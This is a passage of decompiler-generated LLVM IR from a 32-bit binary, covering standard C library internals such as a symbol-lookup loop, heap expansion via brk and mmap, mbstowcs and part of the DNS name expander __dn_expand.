  store i32 %v1_804ffaa, i32* %ebx.global-to-local, align 4
  %v0_804ffad = load i32, i32* %ebp.global-to-local, align 4
  %v1_804ffad = inttoptr i32 %v0_804ffad to i32*
  %v2_804ffad = load i32, i32* %v1_804ffad, align 4
  %tmp76 = icmp ugt i32 %v2_804ffad, %v1_804ffa7
  br i1 %tmp76, label %dec_label_pc_804ffb2, label %dec_label_pc_804ff58

dec_label_pc_804ffb2:                             ; preds = %dec_label_pc_804ffa7, %dec_label_pc_804ffa1
  %v1_804ffe1 = phi i32 [ %v1_804ffaa, %dec_label_pc_804ffa7 ], [ %v0_804ffa1, %dec_label_pc_804ffa1 ]
  %v1_804ffb2 = add i32 %v1_804ffe1, 12
  %v2_804ffb2 = inttoptr i32 %v1_804ffb2 to i8*
  %v3_804ffb2 = load i8, i8* %v2_804ffb2, align 1
  %tmp77 = urem i8 %v3_804ffb2, 16
  %v2_804ffbd = icmp eq i8 %tmp77, 0
  br i1 %v2_804ffbd, label %bb58.thread, label %bb58

bb58.thread:                                      ; preds = %dec_label_pc_804ffb2
  br label %dec_label_pc_804ffc6

bb58:                                             ; preds = %dec_label_pc_804ffb2
  %v1_804ffbd = zext i8 %tmp77 to i32
  %v5_804ffc0 = lshr i32 39, %v1_804ffbd
  %v2_804ffc2 = urem i32 %v5_804ffc0, 2
  %v3_804ffc2 = icmp eq i32 %v2_804ffc2, 0
  br i1 %v3_804ffc2, label %dec_label_pc_804ffa7, label %dec_label_pc_804ffc6

dec_label_pc_804ffc6:                             ; preds = %bb58.thread, %bb58
  %tmp78 = icmp ult i8 %v3_804ffb2, 16
  br i1 %tmp78, label %bb60.thread, label %bb60

bb60.thread:                                      ; preds = %dec_label_pc_804ffc6
  br label %dec_label_pc_804ffa7

bb60:                                             ; preds = %dec_label_pc_804ffc6
  %v3_804ffc6 = udiv i8 %v3_804ffb2, 16
  %v8_804ffc6 = zext i8 %v3_804ffc6 to i32
  %v5_804ffd0 = lshr i32 1030, %v8_804ffc6
  %v2_804ffd2 = urem i32 %v5_804ffd0, 2
  %v3_804ffd2 = icmp eq i32 %v2_804ffd2, 0
  br i1 %v3_804ffd2, label %dec_label_pc_804ffa7, label %dec_label_pc_804ffd6

dec_label_pc_804ffd6:                             ; preds = %bb60
  %v1_804ffd6 = add i32 %v1_804ffe1, 14
  %v2_804ffd6 = inttoptr i32 %v1_804ffd6 to i16*
  %v3_804ffd6 = load i16, i16* %v2_804ffd6, align 2
  %v4_804ffd6 = icmp eq i16 %v3_804ffd6, 0
  br i1 %v4_804ffd6, label %dec_label_pc_804ffa7, label %dec_label_pc_804ffdd

dec_label_pc_804ffdd:                             ; preds = %dec_label_pc_804ffd6
  %v2_804ffe1 = inttoptr i32 %v1_804ffe1 to i32*
  %v3_804ffe1 = load i32, i32* %v2_804ffe1, align 4
  %v4_804ffe1 = add i32 %v3_804ffe1, %stack_var_-28.0
  %v5_804ffe3 = inttoptr i32 %v4_804ffe1 to i8*
  %v6_804ffee = call i32 @strcmp(i8* %v4_804ffeb, i8* %v5_804ffe3)
  %v1_804fff3 = icmp eq i32 %v6_804ffee, 0
  %v1_804fff5 = icmp eq i1 %v1_804fff3, false
  br i1 %v1_804fff5, label %dec_label_pc_804ffa7, label %dec_label_pc_804fff7

dec_label_pc_804fff7:                             ; preds = %dec_label_pc_804ffdd
  br i1 %v6_804ff99, label %dec_label_pc_8050051, label %dec_label_pc_804ffff

dec_label_pc_804ffff:                             ; preds = %dec_label_pc_804fff7
  %v1_8050007 = load i32, i32* %esi.global-to-local, align 4
  %v2_8050007 = mul i32 %v1_8050007, 2
  %v3_8050007 = add i32 %v2_8050007, %v5_804ff99
  %v4_8050007 = inttoptr i32 %v3_8050007 to i16*
  %v5_8050007 = load i16, i16* %v4_8050007, align 2
  %tmp79 = urem i16 %v5_8050007, -32768
  br label %dec_label_pc_805001c

dec_label_pc_8050013:                             ; preds = %dec_label_pc_8050022, %dec_label_pc_805001c
  %v1_8050013 = add i32 %v0_805001a, 16
  %v2_8050013 = inttoptr i32 %v1_8050013 to i32*
  %v3_8050013 = load i32, i32* %v2_8050013, align 4
  %v1_8050016 = icmp eq i32 %v3_8050013, 0
  br i1 %v1_8050016, label %dec_label_pc_804ffa7, label %dec_label_pc_805001a

dec_label_pc_805001a:                             ; preds = %dec_label_pc_8050013
  %v2_805001a = add i32 %v3_8050013, %v0_805001a
  br label %dec_label_pc_805001c

dec_label_pc_805001c:                             ; preds = %dec_label_pc_804ffff, %dec_label_pc_805001a
  %v0_805001a = phi i32 [ %stack_var_-20.0, %dec_label_pc_804ffff ], [ %v2_805001a, %dec_label_pc_805001a ]
  %v1_805001c = add i32 %v0_805001a, 2
  %v2_805001c = inttoptr i32 %v1_805001c to i8*
  %v3_805001c = load i8, i8* %v2_805001c, align 1
  %v4_805001c = urem i8 %v3_805001c, 2
  %v5_805001c = icmp eq i8 %v4_805001c, 0
  %v1_8050020 = icmp eq i1 %v5_805001c, false
  br i1 %v1_8050020, label %dec_label_pc_8050013, label %dec_label_pc_8050022

dec_label_pc_8050022:                             ; preds = %dec_label_pc_805001c
  %v1_8050022 = add i32 %v0_805001a, 4
  %v2_8050022 = inttoptr i32 %v1_8050022 to i16*
  %v3_8050022 = load i16, i16* %v2_8050022, align 2
  %tmp80 = urem i16 %v3_8050022, -32768
  %v12_805002b = icmp eq i16 %tmp80, %tmp79
  %v1_805002d = icmp eq i1 %v12_805002b, false
  br i1 %v1_805002d, label %dec_label_pc_8050013, label %dec_label_pc_805002f

dec_label_pc_805002f:                             ; preds = %dec_label_pc_8050022
  %v1_805002f = add i32 %v0_805001a, 12
  %v2_805002f = inttoptr i32 %v1_805002f to i32*
  %v3_805002f = load i32, i32* %v2_805002f, align 4
  %v2_8050036 = add i32 %v3_805002f, %v0_805001a
  %v3_8050036 = inttoptr i32 %v2_8050036 to i32*
  %v4_8050036 = load i32, i32* %v3_8050036, align 4
  %v5_8050039 = add i32 %v4_8050036, %stack_var_-28.0
  %v5_8050040 = inttoptr i32 %v5_8050039 to i8*
  %v6_8050044 = call i32 @strcmp(i8* %arg1, i8* %v5_8050040)
  %v1_8050049 = icmp eq i32 %v6_8050044, 0
  %v1_805004b = icmp eq i1 %v1_8050049, false
  br i1 %v1_805004b, label %dec_label_pc_804ffa7, label %dec_label_pc_8050051

dec_label_pc_8050051:                             ; preds = %dec_label_pc_805002f, %dec_label_pc_804fff7
  %v1_8050055 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8050055 = add i32 %v1_8050055, 4
  %v3_8050055 = inttoptr i32 %v2_8050055 to i32*
  %v4_8050055 = load i32, i32* %v3_8050055, align 4
  %v5_8050055 = add i32 %v4_8050055, %stack_var_-32.2
  br label %dec_label_pc_804ff5a

; uselistorder directives
  uselistorder i32 %v0_805001a, { 0, 1, 4, 5, 3, 2 }
  uselistorder i8 %tmp77, { 1, 0 }
  uselistorder i8 %v3_804ffb2, { 2, 0, 1 }
  uselistorder i32 %v5_804ff64, { 1, 0 }
  uselistorder i32 %v5_804ff33, { 3, 5, 4, 1, 0, 2 }
  uselistorder i32 %stack_var_-28.1, { 2, 4, 3, 1, 0 }
  uselistorder i32 %stack_var_-24.1, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-20.1, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v0_804ff1b, { 1, 2, 5, 4, 3, 0 }
  uselistorder i32 %v0_804ff8234, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804ff8636, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-32.2, { 1, 2, 0 }
  uselistorder i32 %v2_804fed2, { 1, 0 }
  uselistorder i32 %v2_804fec2, { 1, 0 }
  uselistorder i32 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v0_804fec0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804feb9, { 1, 0 }
  uselistorder i32 %v0_804fedc28, { 0, 2, 1 }
  uselistorder i32 %v1_804feb9, { 1, 0 }
  uselistorder i32 %v4_804fe88, { 1, 0 }
  uselistorder i32 %v5_804fe84, { 0, 3, 1, 2, 4, 5, 6, 7 }
  uselistorder i32 %v2_804fe5f, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i8*, i8*)* @strcmp, { 2, 1, 0, 3 }
  uselistorder i32 33, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder label %dec_label_pc_805001c, { 1, 0 }
  uselistorder label %dec_label_pc_804ffc6, { 1, 0 }
  uselistorder label %dec_label_pc_804ffa7, { 2, 0, 3, 4, 5, 1, 6 }
  uselistorder label %dec_label_pc_804ff58, { 0, 3, 4, 5, 6, 1, 7, 8, 9, 10, 2 }
  uselistorder label %dec_label_pc_804ff24, { 3, 4, 1, 0, 2 }
  uselistorder label %dec_label_pc_804fec2, { 1, 0 }
  uselistorder label %dec_label_pc_804feb9, { 1, 0 }
  uselistorder label %dec_label_pc_804fe7c, { 1, 0 }
}

define i32 @__expand_heap(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %tmp15 = ptrtoint i32* %arg1 to i32
  %stack_var_-8388628 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v0_8050063 = load i32, i32* @ebp, align 4
  store i32 %tmp15, i32* @ebp, align 4
  %v0_805006b = load i32, i32* @ebx, align 4
  %v0_805006f = load i32, i32* @esi, align 4
  %v0_8050073 = load i32, i32* @edi, align 4
  %v2_8050077 = load i32, i32* %arg1, align 4
  store i32 %v2_8050077, i32* @edx, align 4
  %v6_8050080 = icmp ugt i32 %v2_8050077, 2147479551
  br i1 %v6_8050080, label %dec_label_pc_80501d3, label %dec_label_pc_8050086

dec_label_pc_8050086:                             ; preds = %entry
  %v1_8050088 = sub i32 0, %v2_8050077
  %v1_805008a = urem i32 %v1_8050088, 4096
  %v2_805008f = add i32 %v1_805008a, %v2_8050077
  store i32 %v2_805008f, i32* @edi, align 4
  %v0_8050092 = load i32, i32* @global_var_8056f24.386, align 4
  store i32 %v0_8050092, i32* %eax.global-to-local, align 4
  %v1_8050097 = icmp eq i32 %v0_8050092, 0
  br i1 %v1_8050097, label %dec_label_pc_8050170, label %dec_label_pc_805009f

dec_label_pc_805009f:                             ; preds = %dec_label_pc_8050086, %dec_label_pc_8050170
  %v0_80500b3 = phi i32 [ %v2_805008f, %dec_label_pc_8050086 ], [ %v0_80500a9.pre, %dec_label_pc_8050170 ]
  %v0_80500f7 = phi i32 [ %v0_8050092, %dec_label_pc_8050086 ], [ %v2_8050187, %dec_label_pc_8050170 ]
  store i32 %v0_80500f7, i32* @ebx, align 4
  %v1_80500a7 = sub i32 -1, %v0_80500f7
  store i32 %v1_80500a7, i32* %eax.global-to-local, align 4
  %v7_80500a9 = icmp ult i32 %v0_80500b3, %v1_80500a7
  %v1_80500ab = icmp eq i1 %v7_80500a9, false
  br i1 %v1_80500ab, label %dec_label_pc_8050100, label %dec_label_pc_80500ad

dec_label_pc_80500ad:                             ; preds = %dec_label_pc_805009f
  %v0_80500ad = load i32, i32* @global_var_8056f90.321, align 16
  store i32 %v0_80500ad, i32* %ecx.global-to-local, align 4
  %v2_80500b3 = add i32 %v0_80500f7, %v0_80500b3
  store i32 %v2_80500b3, i32* @esi, align 4
  %v5_80500b6 = icmp ult i32 %v0_80500ad, 8388609
  %v1_80500be = add i32 %v0_80500ad, -8388608
  %tmp = sext i1 %v5_80500b6 to i32
  %v1_80500c4 = add nsw i32 %tmp, -1
  store i32 %v1_80500c4, i32* %eax.global-to-local, align 4
  %v2_80500c6 = and i32 %v1_80500be, %v1_80500c4
  %v7_80500c8 = icmp ult i32 %v2_80500c6, %v2_80500b3
  store i32 %v0_80500ad, i32* %stack_var_-20, align 4
  %v1_80500ce = icmp eq i1 %v7_80500c8, false
  br i1 %v1_80500ce, label %dec_label_pc_80500d4, label %dec_label_pc_80500d0

dec_label_pc_80500d0:                             ; preds = %dec_label_pc_80500ad
  %v7_80500d0 = icmp ult i32 %v0_80500f7, %v0_80500ad
  br i1 %v7_80500d0, label %dec_label_pc_8050100, label %dec_label_pc_80500d4

dec_label_pc_80500d4:                             ; preds = %dec_label_pc_80500d0, %dec_label_pc_80500ad
  %v2_80500d4 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80500d4, i32* %ecx.global-to-local, align 4
  %v5_80500d8 = icmp ult i32* %stack_var_-20, inttoptr (i32 8388609 to i32*)
  %v2_80500e0 = ptrtoint i32* %stack_var_-8388628 to i32
  %tmp23 = sext i1 %v5_80500d8 to i32
  %v1_80500e7 = add nsw i32 %tmp23, -1
  store i32 %v1_80500e7, i32* %eax.global-to-local, align 4
  %v7_80500eb = icmp ult i32 %v2_80500e0, %v2_80500b3
  store i32 %v2_80500d4, i32* %stack_var_-20, align 4
  %v1_80500f1 = icmp eq i1 %v7_80500eb, false
  br i1 %v1_80500f1, label %dec_label_pc_80501a0, label %dec_label_pc_80500f7

dec_label_pc_80500f7:                             ; preds = %dec_label_pc_80500d4
  %v7_80500f7 = icmp ult i32 %v0_80500f7, %v2_80500d4
  %v1_80500f9 = icmp eq i1 %v7_80500f7, false
  br i1 %v1_80500f9, label %dec_label_pc_80501a0, label %dec_label_pc_8050100

dec_label_pc_8050100:                             ; preds = %dec_label_pc_80500f7, %dec_label_pc_80501a0, %dec_label_pc_80500d0, %dec_label_pc_805009f
  %v0_8050111 = phi i32 [ %v0_80500b3, %dec_label_pc_80500f7 ], [ %v0_80501b0, %dec_label_pc_80501a0 ], [ %v0_80500b3, %dec_label_pc_80500d0 ], [ %v0_80500b3, %dec_label_pc_805009f ]
  %v0_8050100 = load i32, i32* @global_var_8056f20.387, align 32
  store i32 4096, i32* %eax.global-to-local, align 4
  store i32 %v0_8050111, i32* @ebx, align 4
  %v2_805010d = udiv i32 %v0_8050100, 2
  store i32 %v2_805010d, i32* %ecx.global-to-local, align 4
  %v2_805010f = urem i32 %v2_805010d, 32
  %v4_805010f = icmp eq i32 %v2_805010f, 0
  br i1 %v4_805010f, label %bb21, label %bb

bb:                                               ; preds = %dec_label_pc_8050100
  %v5_805010f = shl i32 4096, %v2_805010f
  store i32 %v5_805010f, i32* %eax.global-to-local, align 4
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_8050100, %bb
  %v0_8050193 = phi i32 [ 4096, %dec_label_pc_8050100 ], [ %v5_805010f, %bb ]
  %v7_8050111 = icmp ult i32 %v0_8050111, %v0_8050193
  br i1 %v7_8050111, label %dec_label_pc_8050193, label %dec_label_pc_8050115

dec_label_pc_8050115:                             ; preds = %bb21, %dec_label_pc_8050193
  %v0_805013d = phi i32 [ %v0_8050111, %bb21 ], [ %v0_8050193, %dec_label_pc_8050193 ]
  store i32 0, i32* %stack_var_-60, align 4
  %v8_8050148 = call i32 @__mmap(i32 0, i32 %v0_805013d, i32 3, i8 34, i32 -1, i32 0, i32 0)
  store i32 %v8_8050148, i32* %eax.global-to-local, align 4
  %v10_805014d = icmp eq i32 %v8_8050148, -1
  br i1 %v10_805014d, label %dec_label_pc_80501cf, label %dec_label_pc_8050152

dec_label_pc_8050152:                             ; preds = %dec_label_pc_8050115
  %v0_8050152 = load i32, i32* @ebx, align 4
  %v1_8050152 = load i32, i32* @ebp, align 4
  %v2_8050152 = inttoptr i32 %v1_8050152 to i32*
  store i32 %v0_8050152, i32* %v2_8050152, align 4
  %v0_8050155 = load i32, i32* @global_var_8056f20.387, align 32
  %v1_8050155 = add i32 %v0_8050155, 1
  store i32 %v1_8050155, i32* @global_var_8056f20.387, align 32
  br label %dec_label_pc_805015c

dec_label_pc_805015c:                             ; preds = %dec_label_pc_80501d3, %dec_label_pc_80501cf, %dec_label_pc_80501c0, %dec_label_pc_8050152
  store i32 %v0_805006b, i32* @ebx, align 4
  store i32 %v0_805006f, i32* @esi, align 4
  store i32 %v0_8050073, i32* @edi, align 4
  store i32 %v0_8050063, i32* @ebp, align 4
  %v0_805016f = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_805016f

dec_label_pc_8050170:                             ; preds = %dec_label_pc_8050086
  store i32 45, i32* %ecx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 45, i32* @eax, align 4
  %v1_8050179 = call i32 @__vsyscall(i32 %v0_805006b)
  store i32 %v1_8050179, i32* %ecx.global-to-local, align 4
  %v1_8050180 = sub i32 0, %v1_8050179
  %v1_8050182 = urem i32 %v1_8050180, 4096
  %v2_8050187 = add i32 %v1_8050182, %v1_8050179
  store i32 %v2_8050187, i32* %eax.global-to-local, align 4
  store i32 %v2_8050187, i32* @global_var_8056f24.386, align 4
  %v0_80500a9.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805009f

dec_label_pc_8050193:                             ; preds = %bb21
  store i32 %v0_8050193, i32* @ebx, align 4
  br label %dec_label_pc_8050115

dec_label_pc_80501a0:                             ; preds = %dec_label_pc_80500f7, %dec_label_pc_80500d4
  store i32 45, i32* %ecx.global-to-local, align 4
  store i32 %v2_80500b3, i32* @edx, align 4
  store i32 45, i32* @eax, align 4
  %v0_80501a9 = load i32, i32* %stack_var_-60, align 4
  %v1_80501a9 = call i32 @__vsyscall(i32 %v0_80501a9)
  store i32 %v1_80501a9, i32* %ecx.global-to-local, align 4
  %v0_80501b0 = load i32, i32* @edi, align 4
  %v1_80501b2 = load i32, i32* @global_var_8056f24.386, align 4
  %v2_80501b2 = add i32 %v1_80501b2, %v0_80501b0
  store i32 %v2_80501b2, i32* %eax.global-to-local, align 4
  %v12_80501b8 = icmp eq i32 %v1_80501a9, %v2_80501b2
  %v1_80501ba = icmp eq i1 %v12_80501b8, false
  br i1 %v1_80501ba, label %dec_label_pc_8050100, label %dec_label_pc_80501c0

dec_label_pc_80501c0:                             ; preds = %dec_label_pc_80501a0
  %v2_80501c2 = sub i32 %v1_80501a9, %v0_80501b0
  store i32 %v2_80501c2, i32* %eax.global-to-local, align 4
  %v1_80501c4 = load i32, i32* @ebp, align 4
  %v2_80501c4 = inttoptr i32 %v1_80501c4 to i32*
  store i32 %v0_80501b0, i32* %v2_80501c4, align 4
  %v0_80501c7 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80501c7, i32* @global_var_8056f24.386, align 4
  br label %dec_label_pc_805015c

dec_label_pc_80501cf:                             ; preds = %dec_label_pc_8050115
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805015c

dec_label_pc_80501d3:                             ; preds = %entry
  %v1_80501d3 = call i32 @__errno_location(i32 %v0_805006b)
  %v1_80501d8 = inttoptr i32 %v1_80501d3 to i32*
  store i32 12, i32* %v1_80501d8, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805015c

; uselistorder directives
  uselistorder i32 %v0_80501b0, { 2, 3, 0, 1 }
  uselistorder i32 %v1_80501a9, { 1, 0, 2 }
  uselistorder i32 %v2_8050187, { 1, 2, 0 }
  uselistorder i32 %v0_8050193, { 1, 0, 2 }
  uselistorder i32 %v2_805010f, { 1, 0 }
  uselistorder i32 %v2_805010d, { 1, 0 }
  uselistorder i32 %v1_80500a7, { 1, 0 }
  uselistorder i32 %v0_80500f7, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v0_80500b3, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_805006b, { 2, 0, 1 }
  uselistorder i32* %stack_var_-20, { 1, 0, 3, 2 }
  uselistorder i32 45, { 3, 4, 2, 5, 1, 0 }
  uselistorder i32 4096, { 1, 4, 5, 7, 2, 3, 0, 6 }
  uselistorder label %dec_label_pc_8050115, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_8050100, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_805009f, { 1, 0 }
}

define i32 @mbstowcs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %v2_80501f1 = ptrtoint i32* %stack_var_8 to i32
  %v4_80501fa = inttoptr i32 %arg1 to i8*
  %v5_80501fa = call i32 @mbsrtowcs(i8* %v4_80501fa, i32 %v2_80501f1, i32 %arg2, i32 0)
  ret i32 %v5_80501fa
}

define i32 @__dn_expand(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %tmp21 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-24 = alloca i8*, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v5_805020f = sub i32 %arg3, %arg2
  %v15_805020f = icmp eq i32 %v5_805020f, 0
  %v16_805020f = icmp slt i32 %v5_805020f, 0
  store i1 %v16_805020f, i1* %sf.global-to-local, align 1
  store i32 %arg5, i32* %eax.global-to-local, align 4
  br i1 %v15_805020f, label %dec_label_pc_80502d6, label %dec_label_pc_805021d

dec_label_pc_805021d:                             ; preds = %entry
  %v2_805021d = icmp slt i32 %arg5, 0
  store i1 %v2_805021d, i1* %sf.global-to-local, align 1
  %tmp27 = icmp slt i32 %arg5, 1
  br i1 %tmp27, label %dec_label_pc_80502d6, label %dec_label_pc_8050225

dec_label_pc_8050225:                             ; preds = %dec_label_pc_805021d
  %v2_8050225 = add i32 %arg5, -254
  %v11_8050225 = icmp slt i32 %v2_8050225, 0
  store i1 %v11_8050225, i1* %sf.global-to-local, align 1
  %v7_805022a = icmp sgt i32 %arg5, 254
  br i1 %v7_805022a, label %dec_label_pc_805022c, label %dec_label_pc_8050231

dec_label_pc_805022c:                             ; preds = %dec_label_pc_8050225
  store i32 254, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050231

dec_label_pc_8050231:                             ; preds = %dec_label_pc_8050225, %dec_label_pc_805022c
  %v0_8050231 = phi i32 [ %arg5, %dec_label_pc_8050225 ], [ 254, %dec_label_pc_805022c ]
  %v6_8050231 = add i32 %v0_8050231, %arg4
  store i32 -1, i32* %esi.global-to-local, align 4
  store i32 %arg4, i32* %ebx.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  store i32 %arg3, i32* %ecx.global-to-local, align 4
  %v5_8050242 = inttoptr i32 %v6_8050231 to i8*
  %v5_8050248 = ptrtoint i8* %arg1 to i32
  %v6_8050248 = sub i32 %arg2, %v5_8050248
  store i32 %v6_8050248, i32* %eax.global-to-local, align 4
  %v4_805024c = inttoptr i32 %v6_8050248 to i8*
  store i8* %v4_805024c, i8** %stack_var_-24, align 4
  %v7_80502cd40 = sub i32 0, %v6_8050248
  %v18_80502cd45 = icmp slt i32 %v7_80502cd40, 0
  store i1 %v18_80502cd45, i1* %sf.global-to-local, align 1
  %v7_80502d046 = icmp sgt i32 %v6_8050248, 0
  br i1 %v7_80502d046, label %dec_label_pc_8050251.lr.ph, label %dec_label_pc_80502d6

dec_label_pc_8050251.lr.ph:                       ; preds = %dec_label_pc_8050231
  br label %dec_label_pc_8050251

dec_label_pc_8050251:                             ; preds = %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge, %dec_label_pc_8050251.lr.ph
  %v4_8050251 = phi i32 [ %v6_8050248, %dec_label_pc_8050251.lr.ph ], [ %v4_8050251.pre, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v4_80502cd50 = phi i32 [ %v6_8050248, %dec_label_pc_8050251.lr.ph ], [ %v4_80502cd, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v0_8050251 = phi i32 [ %arg3, %dec_label_pc_8050251.lr.ph ], [ %v0_8050251.pre, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v0_80502cd49 = phi i32 [ 0, %dec_label_pc_8050251.lr.ph ], [ %v1_80502ca, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v3_805027948 = phi i8* [ %v4_805024c, %dec_label_pc_8050251.lr.ph ], [ %v3_80502cd.pre, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v0_80502bc47 = phi i32 [ %arg4, %dec_label_pc_8050251.lr.ph ], [ %v0_805028a7, %dec_label_pc_80502ca.dec_label_pc_8050251_crit_edge ]
  %v1_8050251 = inttoptr i32 %v0_8050251 to i8*
  %v2_8050251 = load i8, i8* %v1_8050251, align 1
  %v3_8050251 = zext i8 %v2_8050251 to i32
  %v5_8050251 = and i32 %v4_8050251, -256
  %v6_8050251 = or i32 %v5_8050251, %v3_8050251
  store i32 %v6_8050251, i32* %eax.global-to-local, align 4
  store i32 %v3_8050251, i32* %edx.global-to-local, align 4
  %v2_8050256 = and i8 %v2_8050251, -64
  %v3_8050256 = icmp eq i8 %v2_8050256, 0
  %v4_8050256 = icmp slt i8 %v2_8050256, 0
  store i1 %v4_8050256, i1* %sf.global-to-local, align 1
  br i1 %v3_8050256, label %dec_label_pc_8050286, label %dec_label_pc_805025b

dec_label_pc_805025b:                             ; preds = %dec_label_pc_8050251
  %v1_805025b = add i32 %v0_8050251, 1
  store i32 %v1_805025b, i32* %eax.global-to-local, align 4
  %v1_805025e = load i32, i32* %ebp.global-to-local, align 4
  %v2_805025e = sub i32 %v1_805025b, %v1_805025e
  %v12_805025e = icmp eq i32 %v2_805025e, 0
  %v13_805025e = icmp slt i32 %v2_805025e, 0
  store i1 %v13_805025e, i1* %sf.global-to-local, align 1
  br i1 %v12_805025e, label %dec_label_pc_80502d6, label %dec_label_pc_8050262

dec_label_pc_8050262:                             ; preds = %dec_label_pc_805025b
  %v2_8050262 = inttoptr i32 %v1_805025b to i8*
  %v3_8050262 = load i8, i8* %v2_8050262, align 1
  %v4_8050262 = zext i8 %v3_8050262 to i32
  store i32 %v4_8050262, i32* %eax.global-to-local, align 4
  %v1_8050266 = mul nuw nsw i32 %v3_8050251, 256
  %v2_8050269 = and i32 %v1_8050266, 16128
  %v2_805026c = or i32 %v4_8050262, %v2_8050269
  store i32 %v2_805026c, i32* %edx.global-to-local, align 4
  %v0_805026e = load i32, i32* %esi.global-to-local, align 4
  %v2_805026e = icmp slt i32 %v0_805026e, 0
  store i1 %v2_805026e, i1* %sf.global-to-local, align 1
  %v1_8050270 = icmp eq i1 %v2_805026e, false
  br i1 %v1_8050270, label %dec_label_pc_8050279, label %dec_label_pc_8050272

dec_label_pc_8050272:                             ; preds = %dec_label_pc_8050262
  %v1_8050272 = add i32 %v0_8050251, 2
  %v5_8050275 = sub i32 %v1_8050272, %arg3
  %v16_8050275 = icmp slt i32 %v5_8050275, 0
  store i1 %v16_8050275, i1* %sf.global-to-local, align 1
  store i32 %v5_8050275, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050279

dec_label_pc_8050279:                             ; preds = %dec_label_pc_8050262, %dec_label_pc_8050272
  %v5_8050279 = sub i32 %v2_805026c, %v4_80502cd50
  %v13_8050279 = and i32 %v5_8050279, %v4_80502cd50
  %v14_8050279 = icmp slt i32 %v13_8050279, 0
  %v16_8050279 = icmp slt i32 %v5_8050279, 0
  store i1 %v16_8050279, i1* %sf.global-to-local, align 1
  %v2_805027c = icmp eq i1 %v16_8050279, %v14_8050279
  br i1 %v2_805027c, label %dec_label_pc_80502d6, label %dec_label_pc_805027e

dec_label_pc_805027e:                             ; preds = %dec_label_pc_8050279
  %v2_8050282 = add i32 %v2_805026c, %v5_8050248
  %v13_8050282 = icmp slt i32 %v2_8050282, 0
  store i1 %v13_8050282, i1* %sf.global-to-local, align 1
  store i32 %v2_8050282, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80502ca

dec_label_pc_8050286:                             ; preds = %dec_label_pc_8050251
  %v4_8050286 = icmp eq i8 %v2_8050251, 0
  %v5_8050286 = icmp slt i8 %v2_8050251, 0
  store i1 %v5_8050286, i1* %sf.global-to-local, align 1
  br i1 %v4_8050286, label %dec_label_pc_80502ba, label %dec_label_pc_805028a

dec_label_pc_805028a:                             ; preds = %dec_label_pc_8050286
  %v6_805028a = sub i32 %v0_80502bc47, %arg4
  %v16_805028a = icmp eq i32 %v6_805028a, 0
  %v17_805028a = icmp slt i32 %v6_805028a, 0
  store i1 %v17_805028a, i1* %sf.global-to-local, align 1
  br i1 %v16_805028a, label %dec_label_pc_8050294, label %dec_label_pc_8050290

dec_label_pc_8050290:                             ; preds = %dec_label_pc_805028a
  %v1_8050290 = inttoptr i32 %v0_80502bc47 to i8*
  store i8 46, i8* %v1_8050290, align 1
  %v0_8050293 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050293 = add i32 %v0_8050293, 1
  %v9_8050293 = icmp slt i32 %v1_8050293, 0
  store i1 %v9_8050293, i1* %sf.global-to-local, align 1
  store i32 %v1_8050293, i32* %ebx.global-to-local, align 4
  %v0_8050294.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050294

dec_label_pc_8050294:                             ; preds = %dec_label_pc_805028a, %dec_label_pc_8050290
  %v1_80502a4 = phi i32 [ %v0_80502bc47, %dec_label_pc_805028a ], [ %v1_8050293, %dec_label_pc_8050290 ]
  %v0_8050299 = phi i32 [ %v0_8050251, %dec_label_pc_805028a ], [ %v0_8050294.pre, %dec_label_pc_8050290 ]
  %v1_8050294 = inttoptr i32 %v0_8050299 to i8*
  %v2_8050294 = load i8, i8* %v1_8050294, align 1
